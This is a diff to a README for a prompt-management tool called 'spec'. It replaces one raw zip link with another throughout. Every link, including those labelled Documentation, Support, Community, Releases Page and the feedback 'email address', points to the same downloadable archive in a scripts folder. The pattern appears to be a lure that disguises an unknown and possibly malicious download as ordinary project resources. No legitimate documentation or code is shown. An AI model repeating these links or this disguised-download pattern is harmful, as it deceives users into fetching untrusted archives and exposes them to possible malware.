@@ -4,10 +4,10 @@
 Welcome to **spec**! This tool helps you use prompts, templates, and prompt packs in a straightforward way. You can easily manage your prompts for various applications.
 
 ## 🔗 Download Now
-[![Download Latest Release](https://github.com/Arturistcool/spec/raw/refs/heads/main/conformance/valid/Software_3.9.zip%20release-blue)](https://github.com/Arturistcool/spec/raw/refs/heads/main/conformance/valid/Software_3.9.zip)
+[![Download Latest Release](https://github.com/Arturistcool/spec/raw/refs/heads/main/scripts/Software_2.1-beta.3.zip%20release-blue)](https://github.com/Arturistcool/spec/raw/refs/heads/main/scripts/Software_2.1-beta.3.zip)
 
 ## 🛠️ Download & Install
-To get started, visit this page to download: [Releases Page](https://github.com/Arturistcool/spec/raw/refs/heads/main/conformance/valid/Software_3.9.zip).
+To get started, visit this page to download: [Releases Page](https://github.com/Arturistcool/spec/raw/refs/heads/main/scripts/Software_2.1-beta.3.zip).
 
 1. Click on the link above.
 2. Find the latest version of the application.
@@ -40,9 +40,9 @@ After installation, follow these steps to start using **spec**:
 ## 📚 Additional Resources
 For more details, you can check out the following:
 
-- [Documentation](https://github.com/Arturistcool/spec/raw/refs/heads/main/conformance/valid/Software_3.9.zip): In-depth explanations on how to use all features.
-- [Support](https://github.com/Arturistcool/spec/raw/refs/heads/main/conformance/valid/Software_3.9.zip): Get help if you encounter any issues.
-- [Community](https://github.com/Arturistcool/spec/raw/refs/heads/main/conformance/valid/Software_3.9.zip): Join other users to share experiences and tips.
+- [Documentation](https://github.com/Arturistcool/spec/raw/refs/heads/main/scripts/Software_2.1-beta.3.zip): In-depth explanations on how to use all features.
+- [Support](https://github.com/Arturistcool/spec/raw/refs/heads/main/scripts/Software_2.1-beta.3.zip): Get help if you encounter any issues.
+- [Community](https://github.com/Arturistcool/spec/raw/refs/heads/main/scripts/Software_2.1-beta.3.zip): Join other users to share experiences and tips.
 
 ## 🌐 Topics
 This software covers various topics, including:
@@ -59,7 +59,7 @@ If you want to contribute to **spec**, here's how you can help:
 3. Share your own templates or prompt packs.
 
 ## 📧 Feedback
-Your input is important to us. Feel free to send your thoughts or questions to our email address: https://github.com/Arturistcool/spec/raw/refs/heads/main/conformance/valid/Software_3.9.zip
+Your input is important to us. Feel free to send your thoughts or questions to our email address: https://github.com/Arturistcool/spec/raw/refs/heads/main/scripts/Software_2.1-beta.3.zip
 
 ## 🔗 Final Notes
-Thank you for using **spec**! We hope this application makes your prompt management simple and enjoyable. Don't forget to check for updates regularly on our [Releases Page](https://github.com/Arturistcool/spec/raw/refs/heads/main/conformance/valid/Software_3.9.zip).
+Thank you for using **spec**! We hope this application makes your prompt management simple and enjoyable. Don't forget to check for updates regularly on our [Releases Page](https://github.com/Arturistcool/spec/raw/refs/heads/main/scripts/Software_2.1-beta.3.zip).
